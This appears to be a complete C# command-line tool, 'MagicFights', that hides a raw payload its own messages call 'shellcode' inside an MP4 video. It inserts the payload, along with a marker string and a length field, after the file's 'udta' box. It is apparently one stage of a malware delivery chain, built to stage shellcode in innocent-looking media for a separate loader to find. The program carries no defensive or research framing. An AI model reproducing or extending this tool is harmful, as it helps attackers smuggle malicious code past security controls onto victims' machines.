using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Collections;

namespace MagicFights
{
    public class Class1
    {
        private static void InsertRawDataIntoMP4(string mp4FilePath, string rawDataFilePath, string outputFilePath)
        {
            // Read the contents of the MP4 file
            byte[] mp4Data = File.ReadAllBytes(mp4FilePath);

            // Read the contents of the raw data file
            byte[] rawData = File.ReadAllBytes(rawDataFilePath);

            // Generate the prepended sequence and size of raw data
            byte[] prependSequence = { 0x4d, 0x75, 0x73, 0x69, 0x63, 0x49, 0x73, 0x46, 0x6f, 0x72, 0x54, 0x68, 0x65, 0x42, 0x69, 0x72, 0x64, 0x73, 0x21 };    // MusicIsForTheBirds!
            byte[] sizeBytes = BitConverter.GetBytes(rawData.Length);
            // Insert the prepended sequence and size of raw data into the center of the MP4 file
            byte[] modifiedData = InsertDataIntoMP4(mp4Data, prependSequence, sizeBytes, rawData);

            // Save the modified MP4 file to the specified output file path
            File.WriteAllBytes(outputFilePath, modifiedData);
        }

        private static byte[] InsertDataIntoMP4(byte[] mp4Data, byte[] prependSequence, byte[] sizeBytes, byte[] rawData)
        {
            // Find the index of the "udta" string in the MP4 data
            int udtaIndex = FindSequenceIndex(mp4Data, new byte[] { 0x75, 0x64, 0x74, 0x61 }); // "udta"

            if (udtaIndex == -1)
            {
                throw new Exception("[-] Could not find the UserData box (udta) in the MP4 file.");
            }

            // Calculate the total size of the modified MP4 data
            int modifiedDataSize = mp4Data.Length + prependSequence.Length + sizeBytes.Length + rawData.Length;

            // Create a new byte array to hold the modified MP4 data
            byte[] modifiedData = new byte[modifiedDataSize];

            // Copy the MP4 data before the insertion index
            Buffer.BlockCopy(mp4Data, 0, modifiedData, 0, udtaIndex + 4);

            // Copy the prepended sequence
            Buffer.BlockCopy(prependSequence, 0, modifiedData, udtaIndex + 4, prependSequence.Length);
            Console.WriteLine("[+] Prepended secret sequence: " + System.Text.Encoding.UTF8.GetString(prependSequence));

            // Copy the size of raw data
            Buffer.BlockCopy(sizeBytes, 0, modifiedData, udtaIndex + 4 + prependSequence.Length, sizeBytes.Length);
            Console.WriteLine("[+] Prepended shellcode size int: " + rawData.Length);

            // Copy the raw data
            Buffer.BlockCopy(rawData, 0, modifiedData, udtaIndex + 4 + prependSequence.Length + sizeBytes.Length, rawData.Length);
            Console.WriteLine("[+] Copied shellcode data to file");

            // Copy the remaining MP4 data after the insertion index
            Buffer.BlockCopy(mp4Data, udtaIndex + 4, modifiedData, udtaIndex + 4 + prependSequence.Length + sizeBytes.Length + rawData.Length, mp4Data.Length - udtaIndex - 4);

            return modifiedData;
        }


        private static int FindSequenceIndex(byte[] data, byte[] sequence)
        {
            for (int i = 0; i <= data.Length - sequence.Length; i++)
            {
                if (data[i] == sequence[0] && data.Skip(i).Take(sequence.Length).SequenceEqual(sequence))
                {
                    return i;
                }
            }

            return -1;
        }

        static void Main(string[] args)
        {
            // Check if the required command-line arguments are provided
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: MagicFights.exe <MP4FilePath> <RawDataFilePath> <OutputFilePath>");
                return;
            }

            string mp4FilePath = args[0];
            string rawDataFilePath = args[1];
            string outputFilePath = args[2];

            try
            {
                // Call the InsertRawDataIntoMP4 function with the provided file paths
                InsertRawDataIntoMP4(mp4FilePath, rawDataFilePath, outputFilePath);
                Console.WriteLine("Raw data inserted into MP4 file successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }
    }
}

